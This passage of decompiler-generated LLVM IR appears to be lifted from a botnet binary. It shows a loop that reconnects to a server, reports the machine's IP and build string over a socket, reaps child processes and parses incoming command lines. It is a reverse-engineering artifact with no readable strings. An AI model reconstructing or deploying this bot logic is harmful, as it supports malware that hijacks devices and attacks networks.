  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_804fbb3 ], [ %stack_var_-28.1.ph, %dec_label_pc_8050291 ], [ %stack_var_-28.1.ph, %dec_label_pc_804fec3 ]
  %stack_var_-64.0.ph = phi i8* [ %tmp104, %dec_label_pc_804fbb3 ], [ %stack_var_-64.2.ph27, %dec_label_pc_8050291 ], [ %stack_var_-64.2.ph27, %dec_label_pc_804fec3 ]
  %stack_var_-60.0.ph31 = phi i32 [ %tmp113, %dec_label_pc_804fbb3 ], [ %stack_var_-60.3, %dec_label_pc_8050291 ], [ %stack_var_-60.2, %dec_label_pc_804fec3 ]
  %stack_var_-96.0.ph32 = phi i32 [ 0, %dec_label_pc_804fbb3 ], [ %stack_var_-96.2.ph29, %dec_label_pc_8050291 ], [ %v4_804fec3, %dec_label_pc_804fec3 ]
  %v0_804fbd9183 = call i32 @initConnection()
  store i32 %v0_804fbd9183, i32* %eax.global-to-local, align 4
  %v1_804fbde184 = icmp eq i32 %v0_804fbd9183, 0
  %v0_804fbf1185 = load i32, i32* @esp, align 4
  %v5_804fbf1187 = icmp ult i32 %v0_804fbf1185, 12
  store i1 %v5_804fbf1187, i1* %cf.global-to-local, align 1
  br i1 %v1_804fbde184, label %dec_label_pc_804fbf1, label %dec_label_pc_804fbe2

dec_label_pc_804fbe2:                             ; preds = %dec_label_pc_804fbd9.outer, %dec_label_pc_804fbe2
  %v0_804fbf1189 = phi i32 [ %v0_804fbf1, %dec_label_pc_804fbe2 ], [ %v0_804fbf1185, %dec_label_pc_804fbd9.outer ]
  %v1_804fbe5 = add i32 %v0_804fbf1189, -16
  %v2_804fbe5 = inttoptr i32 %v1_804fbe5 to i32*
  store i32 30, i32* %v2_804fbe5, align 4
  %v0_804fbe7 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804fbe7 = ptrtoint i8* %v0_804fbe7 to i32
  %v2_804fbe7 = call i32 @sleep(i32 %v1_804fbe7)
  store i32 %v2_804fbe7, i32* %eax.global-to-local, align 4
  %v0_804fbec = load i32, i32* @esp, align 4
  %v2_804fbec = icmp ugt i32 %v0_804fbec, -17
  store i1 %v2_804fbec, i1* %cf.global-to-local, align 1
  %v0_804fbd9 = call i32 @initConnection()
  store i32 %v0_804fbd9, i32* %eax.global-to-local, align 4
  %v1_804fbde = icmp eq i32 %v0_804fbd9, 0
  %v0_804fbf1 = load i32, i32* @esp, align 4
  %v5_804fbf1 = icmp ult i32 %v0_804fbf1, 12
  store i1 %v5_804fbf1, i1* %cf.global-to-local, align 1
  br i1 %v1_804fbde, label %dec_label_pc_804fbf1, label %dec_label_pc_804fbe2

dec_label_pc_804fbf1:                             ; preds = %dec_label_pc_804fbe2, %dec_label_pc_804fbd9.outer
  %v0_804fbf1.lcssa = phi i32 [ %v0_804fbf1185, %dec_label_pc_804fbd9.outer ], [ %v0_804fbf1, %dec_label_pc_804fbe2 ]
  %v0_804fbf4 = load i32, i32* @global_var_80617c8.235, align 8
  %v2_804fbf4 = add i32 %v0_804fbf1.lcssa, -16
  %v3_804fbf4 = inttoptr i32 %v2_804fbf4 to i32*
  store i32 %v0_804fbf4, i32* %v3_804fbf4, align 4
  %v0_804fbfa = load i8*, i8** %stack_var_-5888, align 4
  %v1_804fbfa = ptrtoint i8* %v0_804fbfa to i32
  %v2_804fbfa = call i32 @__GI_inet_ntoa(i32 %v1_804fbfa)
  store i32 %v2_804fbfa, i32* %eax.global-to-local, align 4
  %v0_804fbff = load i32, i32* @esp, align 4
  %v2_804fbff = icmp ugt i32 %v0_804fbff, -17
  store i1 %v2_804fbff, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbfa, i32* @ebx, align 4
  %v0_804fc04 = call i32 @getBuild()
  store i32 %v0_804fc04, i32* %eax.global-to-local, align 4
  %v0_804fc09 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804fc09, i32* %edx.global-to-local, align 4
  %v0_804fc0f = load i32, i32* @ebx, align 4
  %v1_804fc0f = load i32, i32* @esp, align 4
  %v2_804fc0f = add i32 %v1_804fc0f, -4
  %v3_804fc0f = inttoptr i32 %v2_804fc0f to i32*
  store i32 %v0_804fc0f, i32* %v3_804fc0f, align 4
  %v2_804fc10 = add i32 %v1_804fc0f, -8
  %v3_804fc10 = inttoptr i32 %v2_804fc10 to i32*
  store i32 %v0_804fc04, i32* %v3_804fc10, align 4
  %v1_804fc11 = add i32 %v1_804fc0f, -12
  %v2_804fc11 = inttoptr i32 %v1_804fc11 to i32*
  store i32 ptrtoint ([12 x i8]* @global_var_8058ca6.449 to i32), i32* %v2_804fc11, align 4
  %v0_804fc16 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fc16 = add i32 %v1_804fc0f, -16
  %v3_804fc16 = inttoptr i32 %v2_804fc16 to i32*
  store i32 %v0_804fc16, i32* %v3_804fc16, align 4
  %v0_804fc17 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804fc17 = ptrtoint i8* %v0_804fc17 to i32
  %v3_804fc17 = call i32 @sockprintf(i32 %v1_804fc17, i32 1)
  store i32 %v3_804fc17, i32* %eax.global-to-local, align 4
  %v0_804fc1c = load i32, i32* @esp, align 4
  %v1_804fc1c = add i32 %v0_804fc1c, 16
  %v2_804fc1c = icmp ugt i32 %v0_804fc1c, -17
  store i1 %v2_804fc1c, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050291.outer

dec_label_pc_804fc3e:                             ; preds = %dec_label_pc_804fe33, %dec_label_pc_804fde7
  %v2_804fc41 = mul i32 %storemerge17, 4
  store i32 %v2_804fc41, i32* %edx.global-to-local, align 4
  %v0_804fc46 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804fc4b = add i32 %v0_804fc46, %v2_804fc41
  store i32 %v2_804fc4b, i32* %eax.global-to-local, align 4
  %v1_804fc4e = inttoptr i32 %v2_804fc4b to i32*
  %v2_804fc4e = load i32, i32* %v1_804fc4e, align 4
  store i32 %v2_804fc4e, i32* %eax.global-to-local, align 4
  %tmp261 = and i32 %v0_804fc50.in, -4
  %v5_804fc50 = icmp eq i32 %tmp261, -16
  store i1 %v5_804fc50, i1* %cf.global-to-local, align 1
  %v1_804fc53 = add i32 %v0_804fc50.in, 8
  %v2_804fc53 = inttoptr i32 %v1_804fc53 to i32*
  store i32 1, i32* %v2_804fc53, align 4
  %v1_804fc55 = add i32 %v0_804fc50.in, 4
  %v2_804fc55 = inttoptr i32 %v1_804fc55 to i32*
  store i32 0, i32* %v2_804fc55, align 4
  %v0_804fc57 = load i32, i32* %eax.global-to-local, align 4
  %v3_804fc57 = inttoptr i32 %v0_804fc50.in to i32*
  store i32 %v0_804fc57, i32* %v3_804fc57, align 4
  %v4_804fc58 = call i32 @__libc_waitpid(i32 %storemerge17, i32 %v2_804fc58, i32 %stack_var_-60.2)
  store i32 %v4_804fc58, i32* %eax.global-to-local, align 4
  %v0_804fc5d = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp170 = icmp slt i32 %v4_804fc58, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp170, label %dec_label_pc_804fde4, label %dec_label_pc_804fc68

dec_label_pc_804fc68:                             ; preds = %dec_label_pc_804fc3e
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc9b

dec_label_pc_804fc71:                             ; preds = %dec_label_pc_804fc9b, %dec_label_pc_804fcd5
  %v2_804fc74 = mul i32 %storemerge19, 4
  %v0_804fc79 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804fc7e = add i32 %v0_804fc79, %v2_804fc74
  %v1_804fc81 = add i32 %v2_804fc7e, -4
  store i32 %v2_804fc74, i32* %edx.global-to-local, align 4
  store i32 %v2_804fc7e, i32* %eax.global-to-local, align 4
  %v1_804fc94 = inttoptr i32 %v2_804fc7e to i32*
  %v2_804fc94 = load i32, i32* %v1_804fc94, align 4
  store i32 %v2_804fc94, i32* %eax.global-to-local, align 4
  %v2_804fc96 = inttoptr i32 %v1_804fc81 to i32*
  store i32 %v2_804fc94, i32* %v2_804fc96, align 4
  %v4_804fc98 = add i32 %storemerge19, 1
  br label %dec_label_pc_804fc9b

dec_label_pc_804fc9b:                             ; preds = %dec_label_pc_804fc68, %dec_label_pc_804fc71
  %storemerge19 = phi i32 [ %v4_804fc98, %dec_label_pc_804fc71 ], [ %.pre, %dec_label_pc_804fc68 ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_804fcaf = load i32, i32* @global_var_805b548.34, align 8
  store i32 %v0_804fcaf, i32* %edx.global-to-local, align 4
  %v0_804fcb5 = load i32, i32* @global_var_805b54c.35, align 4
  %v10_804fccd = icmp eq i32 %v0_804fcb5, 0
  br i1 %v10_804fccd, label %dec_label_pc_804fcd5, label %dec_label_pc_804fc71

dec_label_pc_804fcd5:                             ; preds = %dec_label_pc_804fc9b
  store i32 0, i32* @esi, align 4
  store i32 %v0_804fcaf, i32* @edi, align 4
  %v10_804fce9 = icmp ult i32 %storemerge19, %v0_804fcaf
  br i1 %v10_804fce9, label %dec_label_pc_804fc71, label %dec_label_pc_804fcf1

dec_label_pc_804fcf1:                             ; preds = %dec_label_pc_804fcd5
  %v2_804fcf4 = mul i32 %storemerge19, 4
  %v0_804fcf9 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804fcfe = add i32 %v2_804fcf4, -4
  %v1_804fd01 = add i32 %v2_804fcfe, %v0_804fcf9
  %v1_804fd04 = inttoptr i32 %v1_804fd01 to i32*
  store i32 0, i32* %v1_804fd04, align 4
  %v0_804fd0a = load i32, i32* @global_var_805b548.34, align 8
  %v0_804fd0f = load i32, i32* @global_var_805b54c.35, align 4
  %v1_804fd15 = add i32 %v0_804fd0a, -1
  %v4_804fd15 = icmp ne i32 %v0_804fd0a, 0
  %v2_804fd18 = zext i1 %v4_804fd15 to i32
  %v3_804fd18 = add i32 %v0_804fd0f, -1
  %v4_804fd18 = add i32 %v3_804fd18, %v2_804fd18
  store i32 %v1_804fd15, i32* @global_var_805b548.34, align 8
  store i32 %v4_804fd18, i32* @global_var_805b54c.35, align 4
  %v3_804fd31 = mul i32 %v4_804fd18, 4
  %v4_804fd31 = udiv i32 %v1_804fd15, 1073741824
  %v5_804fd31 = or i32 %v3_804fd31, %v4_804fd31
  store i32 %v5_804fd31, i32* %edx.global-to-local, align 4
  %v2_804fd35 = mul i32 %v1_804fd15, 4
  %v1_804fd38 = add i32 %v2_804fd35, 4
  store i32 %v1_804fd38, i32* %eax.global-to-local, align 4
  %v0_804fd3b = load i32, i32* @esp, align 4
  %v5_804fd3b = icmp ult i32 %v0_804fd3b, 12
  store i1 %v5_804fd3b, i1* %cf.global-to-local, align 1
  %v2_804fd3e = add i32 %v0_804fd3b, -16
  %v3_804fd3e = inttoptr i32 %v2_804fd3e to i32*
  store i32 %v1_804fd38, i32* %v3_804fd3e, align 4
  %v1_804fd3f = call i32 @malloc(i32 0)
  store i32 %v1_804fd3f, i32* %eax.global-to-local, align 4
  %v0_804fd44 = load i32, i32* @esp, align 4
  %v2_804fd44 = icmp ugt i32 %v0_804fd44, -17
  store i1 %v2_804fd44, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fd75

dec_label_pc_804fd53:                             ; preds = %dec_label_pc_804fd75, %dec_label_pc_804fdaf
  %v2_804fd56 = mul i32 %storemerge18, 4
  %v5_804fd5b = add i32 %v2_804fd56, %v1_804fd3f
  store i32 %v2_804fd56, i32* %edx.global-to-local, align 4
  %v0_804fd66 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804fd6b = add i32 %v0_804fd66, %v2_804fd56
  store i32 %v2_804fd6b, i32* %eax.global-to-local, align 4
  %v1_804fd6e = inttoptr i32 %v2_804fd6b to i32*
  %v2_804fd6e = load i32, i32* %v1_804fd6e, align 4
  store i32 %v2_804fd6e, i32* %eax.global-to-local, align 4
  %v2_804fd70 = inttoptr i32 %v5_804fd5b to i32*
  store i32 %v2_804fd6e, i32* %v2_804fd70, align 4
  %v4_804fd72 = add i32 %storemerge18, 1
  br label %dec_label_pc_804fd75

dec_label_pc_804fd75:                             ; preds = %dec_label_pc_804fcf1, %dec_label_pc_804fd53
  %storemerge18 = phi i32 [ %v4_804fd72, %dec_label_pc_804fd53 ], [ 0, %dec_label_pc_804fcf1 ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v0_804fd89 = load i32, i32* @global_var_805b548.34, align 8
  store i32 %v0_804fd89, i32* %edx.global-to-local, align 4
  %v0_804fd8f = load i32, i32* @global_var_805b54c.35, align 4
  %v10_804fda7 = icmp eq i32 %v0_804fd8f, 0
  br i1 %v10_804fda7, label %dec_label_pc_804fdaf, label %dec_label_pc_804fd53

dec_label_pc_804fdaf:                             ; preds = %dec_label_pc_804fd75
  store i32 0, i32* @esi, align 4
  store i32 %v0_804fd89, i32* @edi, align 4
  %v10_804fdc3 = icmp ult i32 %storemerge18, %v0_804fd89
  br i1 %v10_804fdc3, label %dec_label_pc_804fd53, label %dec_label_pc_804fdcb

dec_label_pc_804fdcb:                             ; preds = %dec_label_pc_804fdaf
  %v0_804fdcb = load i32, i32* @global_var_80617d4.36, align 4
  store i32 %v0_804fdcb, i32* %eax.global-to-local, align 4
  %v0_804fdd0 = load i32, i32* @esp, align 4
  %v5_804fdd0 = icmp ult i32 %v0_804fdd0, 12
  store i1 %v5_804fdd0, i1* %cf.global-to-local, align 1
  %v2_804fdd3 = add i32 %v0_804fdd0, -16
  %v3_804fdd3 = inttoptr i32 %v2_804fdd3 to i32*
  store i32 %v0_804fdcb, i32* %v3_804fdd3, align 4
  %v1_804fdd4 = call i32 @free(i32 0)
  %v0_804fdd9 = load i32, i32* @esp, align 4
  %v2_804fdd9 = icmp ugt i32 %v0_804fdd9, -17
  store i1 %v2_804fdd9, i1* %cf.global-to-local, align 1
  store i32 %v1_804fd3f, i32* %eax.global-to-local, align 4
  store i32 %v1_804fd3f, i32* @global_var_80617d4.36, align 4
  br label %dec_label_pc_804fde4

dec_label_pc_804fde4:                             ; preds = %dec_label_pc_804fc3e, %dec_label_pc_804fdcb
  %v0_804fc5080.in = phi i32 [ %v0_804fdd9, %dec_label_pc_804fdcb ], [ %v0_804fc5d, %dec_label_pc_804fc3e ]
  %stack_var_-60.1 = phi i32 [ %v1_804fd3f, %dec_label_pc_804fdcb ], [ %stack_var_-60.2, %dec_label_pc_804fc3e ]
  br label %dec_label_pc_804fde7

dec_label_pc_804fde7:                             ; preds = %dec_label_pc_8050291, %dec_label_pc_804fde4
  %v0_804fc50.in = phi i32 [ %v0_804fc5080.in, %dec_label_pc_804fde4 ], [ %v0_80502ac, %dec_label_pc_8050291 ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_804fde4 ], [ %stack_var_-60.3, %dec_label_pc_8050291 ]
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_804fde4 ], [ 0, %dec_label_pc_8050291 ]
  store i32 %storemerge17, i32* %eax.global-to-local, align 4
  %v2_804fdf2 = ashr i32 %storemerge17, 31
  store i32 %v2_804fdf2, i32* %edx.global-to-local, align 4
  %v0_804fdfb = load i32, i32* @global_var_805b548.34, align 8
  store i32 %v0_804fdfb, i32* @esi, align 4
  %v0_804fe01 = load i32, i32* @global_var_805b54c.35, align 4
  store i32 %v0_804fe01, i32* @edi, align 4
  %v10_804fe19 = icmp ult i32 %v2_804fdf2, %v0_804fe01
  store i1 %v10_804fe19, i1* %cf.global-to-local, align 1
  br i1 %v10_804fe19, label %dec_label_pc_804fc3e, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fde7
  store i32 %v0_804fe01, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804fe31 = icmp ugt i32 %v2_804fdf2, %v0_804fe01
  br i1 %v6_804fe31, label %dec_label_pc_804fe45, label %dec_label_pc_804fe33

dec_label_pc_804fe33:                             ; preds = %dec_label_pc_804fe25
  store i32 %v0_804fdfb, i32* %edx.global-to-local, align 4
  %v10_804fe39 = icmp ult i32 %storemerge17, %v0_804fdfb
  store i1 %v10_804fe39, i1* %cf.global-to-local, align 1
  br i1 %v10_804fe39, label %dec_label_pc_804fc3e, label %dec_label_pc_804fe45

dec_label_pc_804fe45:                             ; preds = %dec_label_pc_804fe33, %dec_label_pc_804fe25
  %v0_804fe48 = load i32, i32* @ebp, align 4
  %v2_804fe48 = add i32 %v0_80502a7, -5736
  %v3_804fe48 = add i32 %v2_804fe48, %v0_804fe48
  %v4_804fe48 = inttoptr i32 %v3_804fe48 to i8*
  store i8 0, i8* %v4_804fe48, align 1
  %v0_804fe50 = load i32, i32* @esp, align 4
  %v5_804fe50 = icmp ult i32 %v0_804fe50, 12
  store i1 %v5_804fe50, i1* %cf.global-to-local, align 1
  store i32 %v2_8050291, i32* %eax.global-to-local, align 4
  %v2_804fe59 = add i32 %v0_804fe50, -16
  %v3_804fe59 = inttoptr i32 %v2_804fe59 to i32*
  store i32 %v2_8050291, i32* %v3_804fe59, align 4
  %v0_804fe5a = call i32 @trim()
  %v0_804fe5f = load i32, i32* @esp, align 4
  %tmp255 = and i32 %v0_804fe5f, -8
  %v5_804fe62 = icmp eq i32 %tmp255, -16
  store i1 %v5_804fe62, i1* %cf.global-to-local, align 1
  %v1_804fe65 = add i32 %v0_804fe5f, 4
  %v2_804fe65 = inttoptr i32 %v1_804fe65 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8057a97.21 to i32), i32* %v2_804fe65, align 4
  store i32 %v2_8050291, i32* %eax.global-to-local, align 4
  %v3_804fe70 = inttoptr i32 %v0_804fe5f to i32*
  store i32 %v2_8050291, i32* %v3_804fe70, align 4
  %v3_804fe71 = call i32 @strstr(i32 %v0_804fe01, i8* bitcast (i32* @0 to i8*))
  %v0_804fe76 = load i32, i32* @esp, align 4
  %v1_804fe76 = add i32 %v0_804fe76, 16
  store i32 %v3_804fe71, i32* %edx.global-to-local, align 4
  store i32 %v2_8050291, i32* %eax.global-to-local, align 4
  %v7_804fe81 = icmp ult i32 %v3_804fe71, %v2_8050291
  store i1 %v7_804fe81, i1* %cf.global-to-local, align 1
  %v12_804fe81 = icmp eq i32 %v3_804fe71, %v2_8050291
  %v1_804fe83 = icmp eq i1 %v12_804fe81, false
  br i1 %v1_804fe83, label %dec_label_pc_804fea0, label %dec_label_pc_804fe85

dec_label_pc_804fe85:                             ; preds = %dec_label_pc_804fe45
  %v0_804fe85 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804fe85, i32* %eax.global-to-local, align 4
  %v5_804fe8a = icmp ult i32 %v1_804fe76, 8
  store i1 %v5_804fe8a, i1* %cf.global-to-local, align 1
  %v1_804fe8d = add i32 %v0_804fe76, 4
  %v2_804fe8d = inttoptr i32 %v1_804fe8d to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8058cb2.450 to i32), i32* %v2_804fe8d, align 4
  %v0_804fe92 = load i32, i32* %eax.global-to-local, align 4
  %v3_804fe92 = inttoptr i32 %v0_804fe76 to i32*
  store i32 %v0_804fe92, i32* %v3_804fe92, align 4
  %v2_804fe93 = call i32 @sockprintf(i32 %v0_804fe01, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804fe93, i32* %eax.global-to-local, align 4
  %v0_804fe98 = load i32, i32* @esp, align 4
  %v1_804fe98 = add i32 %v0_804fe98, 16
  %v2_804fe98 = icmp ugt i32 %v0_804fe98, -17
  store i1 %v2_804fe98, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050291

dec_label_pc_804fea0:                             ; preds = %dec_label_pc_804fe45
  %v5_804fea0 = icmp ult i32 %v1_804fe76, 8
  store i1 %v5_804fea0, i1* %cf.global-to-local, align 1
  %v1_804fea3 = add i32 %v0_804fe76, 4
  %v2_804fea3 = inttoptr i32 %v1_804fea3 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8058cb7.451 to i32), i32* %v2_804fea3, align 4
  store i32 %v2_8050291, i32* %eax.global-to-local, align 4
  %v3_804feae = inttoptr i32 %v0_804fe76 to i32*
  store i32 %v2_8050291, i32* %v3_804feae, align 4
  %v3_804feaf = call i32 @strstr(i32 %v0_804fe01, i8* bitcast (i32* @0 to i8*))
  %v0_804feb4 = load i32, i32* @esp, align 4
  store i32 %v3_804feaf, i32* @edx, align 4
  store i32 %v2_8050291, i32* %eax.global-to-local, align 4
  %v7_804febf = icmp ult i32 %v3_804feaf, %v2_8050291
  store i1 %v7_804febf, i1* %cf.global-to-local, align 1
  %v12_804febf = icmp eq i32 %v3_804feaf, %v2_8050291
  %v1_804fec1 = icmp eq i1 %v12_804febf, false
  br i1 %v1_804fec1, label %dec_label_pc_804feeb, label %dec_label_pc_804fec3

dec_label_pc_804fec3:                             ; preds = %dec_label_pc_804fea0
  %v1_804feb4 = add i32 %v0_804feb4, 16
  %v4_804fec3 = add i32 %stack_var_-96.2.ph29, 1
  store i32 ptrtoint ([20 x i8]* @global_var_8058cbb.452 to i32), i32* %eax.global-to-local, align 4
  %v5_804fecb = icmp ult i32 %v1_804feb4, 12
  store i1 %v5_804fecb, i1* %cf.global-to-local, align 1
  %v3_804fece = inttoptr i32 %v0_804feb4 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_8058cbb.452 to i32), i32* %v3_804fece, align 4
  %v1_804fecf = call i32 @zprintf(i32 %v4_804fec3)
  store i32 %v1_804fecf, i32* @eax, align 4
  %v0_804fed4 = load i32, i32* @esp, align 4
  %v9_804fed7 = icmp ult i32 %v4_804fec3, 20
  store i1 %v9_804fed7, i1* %cf.global-to-local, align 1
  %v7_804fedb = icmp sgt i32 %v4_804fec3, 20
  br i1 %v7_804fedb, label %dec_label_pc_804fee1, label %dec_label_pc_804fbd9.outer

dec_label_pc_804fee1:                             ; preds = %dec_label_pc_804fec3
  %v1_804fed4 = add i32 %v0_804fed4, 16
  %v5_804fee1 = icmp ult i32 %v1_804fed4, 12
  store i1 %v5_804fee1, i1* %cf.global-to-local, align 1
  %v2_804fee4 = inttoptr i32 %v0_804fed4 to i32*
  store i32 0, i32* %v2_804fee4, align 4
  %v1_804fee6 = call i32 @__GI_exit(i32 %v4_804fec3)
  store i32 %v1_804fee6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804feeb

dec_label_pc_804feeb:                             ; preds = %dec_label_pc_804fea0, %dec_label_pc_804fee1
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph29, %dec_label_pc_804fea0 ], [ %v4_804fec3, %dec_label_pc_804fee1 ]
  %v2_804fef7 = load i8, i8* %tmp168, align 4
  %v3_804fef7 = zext i8 %v2_804fef7 to i32
  %v6_804fef7 = or i32 %v3_804fef7, %v5_804fef7
  store i32 %v6_804fef7, i32* %eax.global-to-local, align 4
  %v6_804fef9 = icmp ult i8 %v2_804fef7, 33
  store i1 %v6_804fef9, i1* %cf.global-to-local, align 1
  %v10_804fef9 = icmp eq i8 %v2_804fef7, 33
  %v1_804fefb = icmp eq i1 %v10_804fef9, false
  br i1 %v1_804fefb, label %dec_label_pc_8050291.outer26.backedge, label %dec_label_pc_804ff01

dec_label_pc_8050291.outer26.backedge:            ; preds = %dec_label_pc_804feeb, %dec_label_pc_804ff1f, %dec_label_pc_8050245, %dec_label_pc_8050077
  %stack_var_-64.2.ph27.be = phi i8* [ %v22_804fffa, %dec_label_pc_8050077 ], [ %v22_804fffa, %dec_label_pc_8050245 ], [ %tmp168, %dec_label_pc_804ff1f ], [ %tmp168, %dec_label_pc_804feeb ]
  %v0_805029d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050291.outer26

dec_label_pc_804ff01:                             ; preds = %dec_label_pc_804feeb
  store i32 %v1_804ff04, i32* %eax.global-to-local, align 4
  %v2_804ff10191 = load i8, i8* %storemerge16190, align 1
  %v3_804ff10192 = zext i8 %v2_804ff10191 to i32
  %v6_804ff10194 = or i32 %v3_804ff10192, %v5_804fef7
  store i32 %v6_804ff10194, i32* %eax.global-to-local, align 4
  %v3_804ff12195 = icmp ult i8 %v2_804ff10191, 32
  store i1 %v3_804ff12195, i1* %cf.global-to-local, align 1
  %v7_804ff12196 = icmp eq i8 %v2_804ff10191, 32
  br i1 %v7_804ff12196, label %dec_label_pc_804ff1f, label %dec_label_pc_804ff16

dec_label_pc_804ff0a:                             ; preds = %dec_label_pc_804ff16
  %v5_804ff0a = add i32 %storemerge16.in197, 1
  %storemerge16 = inttoptr i32 %v5_804ff0a to i8*
  store i32 %v5_804ff0a, i32* %eax.global-to-local, align 4
  %v2_804ff10 = load i8, i8* %storemerge16, align 1
  %v3_804ff10 = zext i8 %v2_804ff10 to i32
  %v5_804ff10 = and i32 %v5_804ff0a, -256
  %v6_804ff10 = or i32 %v3_804ff10, %v5_804ff10
  store i32 %v6_804ff10, i32* %eax.global-to-local, align 4
  %v3_804ff12 = icmp ult i8 %v2_804ff10, 32
  store i1 %v3_804ff12, i1* %cf.global-to-local, align 1
  %v7_804ff12 = icmp eq i8 %v2_804ff10, 32
  br i1 %v7_804ff12, label %dec_label_pc_804ff1f, label %dec_label_pc_804ff16

dec_label_pc_804ff16:                             ; preds = %dec_label_pc_804ff01, %dec_label_pc_804ff0a
  %v5_804ff10199 = phi i32 [ %v5_804ff10, %dec_label_pc_804ff0a ], [ %v5_804fef7, %dec_label_pc_804ff01 ]
  %storemerge16198 = phi i8* [ %storemerge16, %dec_label_pc_804ff0a ], [ %storemerge16190, %dec_label_pc_804ff01 ]
  %storemerge16.in197 = phi i32 [ %v5_804ff0a, %dec_label_pc_804ff0a ], [ %v1_804ff04, %dec_label_pc_804ff01 ]
  store i32 %storemerge16.in197, i32* %eax.global-to-local, align 4
  %v2_804ff19 = load i8, i8* %storemerge16198, align 1
  %v3_804ff19 = zext i8 %v2_804ff19 to i32
  %v6_804ff19 = or i32 %v3_804ff19, %v5_804ff10199
  store i32 %v6_804ff19, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff1b = icmp eq i8 %v2_804ff19, 0
  %v1_804ff1d = icmp eq i1 %v4_804ff1b, false
  br i1 %v1_804ff1d, label %dec_label_pc_804ff0a, label %dec_label_pc_804ff1f

dec_label_pc_804ff1f:                             ; preds = %dec_label_pc_804ff0a, %dec_label_pc_804ff16, %dec_label_pc_804ff01
  %storemerge16.in.lcssa = phi i32 [ %v1_804ff04, %dec_label_pc_804ff01 ], [ %storemerge16.in197, %dec_label_pc_804ff16 ], [ %v5_804ff0a, %dec_label_pc_804ff0a ]
  %storemerge16.lcssa = phi i8* [ %storemerge16190, %dec_label_pc_804ff01 ], [ %storemerge16198, %dec_label_pc_804ff16 ], [ %storemerge16, %dec_label_pc_804ff0a ]
  %v5_804ff10.lcssa = phi i32 [ %v5_804fef7, %dec_label_pc_804ff01 ], [ %v5_804ff10199, %dec_label_pc_804ff16 ], [ %v5_804ff10, %dec_label_pc_804ff0a ]
  store i32 %storemerge16.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804ff22 = load i8, i8* %storemerge16.lcssa, align 1
  %v3_804ff22 = zext i8 %v2_804ff22 to i32
  %v6_804ff22 = or i32 %v3_804ff22, %v5_804ff10.lcssa
  store i32 %v6_804ff22, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff24 = icmp eq i8 %v2_804ff22, 0
  br i1 %v4_804ff24, label %dec_label_pc_8050291.outer26.backedge, label %dec_label_pc_804ff2c

dec_label_pc_804ff2c:                             ; preds = %dec_label_pc_804ff1f
  store i8 0, i8* %storemerge16.lcssa, align 1
  store i32 %v5_804fef7, i32* %eax.global-to-local, align 4
  %v3_804ff50 = call i32 @_strlen(i8* %storemerge16190)
  %v6_804ff57 = add i32 %v2_8050291, %v3_804ff50
  %v1_804ff5a = add i32 %v6_804ff57, 2
  %v5_804ff5a = icmp ugt i32 %v6_804ff57, -3
  store i1 %v5_804ff5a, i1* %cf.global-to-local, align 1
  store i32 %v1_804ff5a, i32* %eax.global-to-local, align 4
  %v5_804ff5d = inttoptr i32 %v1_804ff5a to i8*
  %v1_804ff95 = and i32 %v1_804ff5a, -256
  br label %dec_label_pc_804ff87

dec_label_pc_804ff62:                             ; preds = %dec_label_pc_804ffaf, %dec_label_pc_804ff87
  store i32 %v1_804ff95, i32* %eax.global-to-local, align 4
  %v3_804ff79 = call i32 @_strlen(i8* %v5_804ff5d)
  %v4_804ff79 = mul i32 %v3_804ff79, -1
  %v1_804ff7f = sub i32 0, %v4_804ff79
  %v6_804ff80 = sub i32 %v1_804ff5a, %v4_804ff79
  %v11_804ff80 = icmp ult i32 %v6_804ff80, %v1_804ff7f
  store i1 %v11_804ff80, i1* %cf.global-to-local, align 1
  %v1_804ff83 = add i32 %v6_804ff80, -1
  store i32 %v1_804ff83, i32* %eax.global-to-local, align 4
  %v1_804ff84 = inttoptr i32 %v1_804ff83 to i8*
  store i8 0, i8* %v1_804ff84, align 1
  br label %dec_label_pc_804ff87

dec_label_pc_804ff87:                             ; preds = %dec_label_pc_804ff2c, %dec_label_pc_804ff62
  store i32 %v1_804ff95, i32* %eax.global-to-local, align 4
  %v3_804ff9e = call i32 @_strlen(i8* %v5_804ff5d)
  %v4_804ff9e = mul i32 %v3_804ff9e, -1
  %v1_804ffa4 = sub i32 0, %v4_804ff9e
  %v6_804ffa5 = sub i32 %v1_804ff5a, %v4_804ff9e
  %v11_804ffa5 = icmp ult i32 %v6_804ffa5, %v1_804ffa4
  store i1 %v11_804ffa5, i1* %cf.global-to-local, align 1
  %v1_804ffa8 = add i32 %v6_804ffa5, -1
  store i32 %v1_804ffa8, i32* %eax.global-to-local, align 4
